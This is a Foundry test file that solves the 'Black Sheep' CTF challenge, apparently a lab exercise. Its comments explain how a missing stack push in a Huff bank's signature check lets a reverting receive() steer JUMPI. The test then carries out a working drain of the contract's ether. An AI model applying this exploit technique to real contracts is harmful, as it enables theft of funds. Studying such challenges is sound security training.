// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "foundry-huff/HuffConfig.sol";

import {ISimpleBank} from "../../src/black-sheep/ISimpleBank.sol";
import {Challenge} from "../../src/black-sheep/Challenge.sol";

contract BlackSheepTest is Test {
  address private challengeAddress;
  ISimpleBank private bank;

  function setUp() public {
    HuffConfig config = new HuffConfig();
    bank = ISimpleBank(config.deploy("black-sheep/SimpleBank"));
    payable(address(bank)).transfer(10 ether);
    challengeAddress = address(new Challenge(bank));
  }

  function testExploit() public {
    // Exploit Analysis
    //
    // The contract exposes a payable function `withdraw(bytes32,uint8,bytes32,bytes32)`.
    // This maps to the Huff macro `WITHDRAW()`, which runs `CHECKVALUE()` and `CHECKSIG()`.
    // If both checks pass, the contract sends its full balance to `msg.sender`.
    //
    // `CHECKVALUE()` verifies `msg.value` is not more than `0x10` wei.
    // If valid, it sends back double the received amount to the caller.
    // A `receive()` function returns `0x1` if the transfer succeeds, `0x0` if it fails.
    // We will keep this fact in mind, as we will need it to complete the exploit afterwards.
    //
    // `CHECKSIG()` uses the precompiled contract `ecrecover` (at address `0x1`).
    // It compares the recovered address to `0xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044`.
    // It pushes `0x00` on the stack if verification passes, `0x01` if it fails.
    //
    // Vulnerability: A valid signature from any address will make `ecrecover` return non-zero.
    // The recovered address is stored at memory location `0x80`.
    // If the signer differs from `0xd8d..044`, the comparison fails silently, that is,
    // no value is pushed to the stack, but execution continues with a `JUMP`.
    //
    // Back in `WITHDRAW()`, the code uses `ISZERO` twice, which is unnecessary.
    // This redundant operation does nothing meaningful, as applying `ISZERO` twice
    // results in the original value. Essentially, it relies on the value pushed
    // by `CHECKSIG()` to decide whether to execute `JUMPI`.
    // Here’s the twist: if `CHECKSIG()` leaves no value on the stack,
    // `JUMPI` will use whatever is on the stack—likely the result of `CHECKVALUE()`.
    //
    // Recall that `CHECKVALUE()` performs a `CALL` to our `receive()` function.
    // This `CALL` returns `0x1` (success) or `0x0` (failure).
    // If our `receive()` function reverts, `CALL` returns `0x0`.
    // This value influences the `JUMPI` decision, allowing us to bypass checks.
    //
    // Exploit Construction
    //
    // 1. Deploy an attack contract with a `receive()` function that:
    //    - Reverts if `msg.value == 0x12` (this will push `0x0` onto the stack).
    //    - Succeeds otherwise, so we can accept the funds we will be sent afterwards.
    //
    // 2. Call `withdraw()` with either:
    //    - A valid signature tuple `(msgHash, v, r, s)` for any signer.
    //    - Or simply `(0x00, 27, 0x00, 0x00)`, which causes `ecrecover` to return a non-zero value.

    // The logic flaw allows us to control stack behavior via `receive()` and exploit
    // the contract to withdraw its balance.
    bytes32 msgHash = keccak256("Black Sheep");
    bytes32 r = 0x9f2c9ed6b027b594f5072cc39b6c5ffca1ca157ad5b661d0d268c577eede360c;
    bytes32 s = 0x52e8bf726d82a28ebd9b172efba7e75fd0671f6c1544b5a5b70ad803de360e33;
    uint8 v = 27;
    bank.withdraw{value: 0x09}(msgHash, v, r, s);

    assertEq(address(Challenge(challengeAddress).BANK()).balance, 0);
  }

  receive() external payable {
    if (msg.value == 0x12) {
      revert("");
    }
  }
}
